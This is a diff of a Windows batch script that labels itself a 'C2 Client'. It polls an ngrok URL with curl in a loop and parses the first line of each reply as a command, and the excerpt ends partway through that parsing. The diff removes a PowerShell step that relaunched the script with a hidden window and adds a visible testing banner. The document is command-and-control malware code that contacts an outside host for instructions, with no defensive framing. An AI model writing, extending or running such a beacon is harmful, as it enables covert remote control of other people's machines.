@@ -1,27 +1,18 @@
 @echo off
-if "%1"=="HIDDEN" goto :hidden_main
-
-rem Self-relaunch hidden using PowerShell (more reliable than mshta)
-powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'HIDDEN' -WindowStyle Hidden"
-exit
-
-:hidden_main
 setlocal enabledelayedexpansion
 set URL=https://noneconomical-trisha-waitingly.ngrok-free.dev
 set LAST_CMD=
 
-echo [*] Starting C2 Client
+echo [*] Starting C2 Client - TESTING VISIBLE
 echo [*] URL: %URL%
 
 :loop
     ping -n 3 127.0.0.1 >nul
     
-    rem Save raw response for debugging
     curl -s --max-time 10 %URL% > %TEMP%\c2_raw.txt 2>nul
     echo [DEBUG] Raw response:
     type %TEMP%\c2_raw.txt
     
-    rem Get FIRST non-empty line as command
     set CMD=
     for /f "usebackq delims=" %%A in (`type %TEMP%\c2_raw.txt ^| findstr /v "^$"`) do (
         if "!CMD!"=="" (
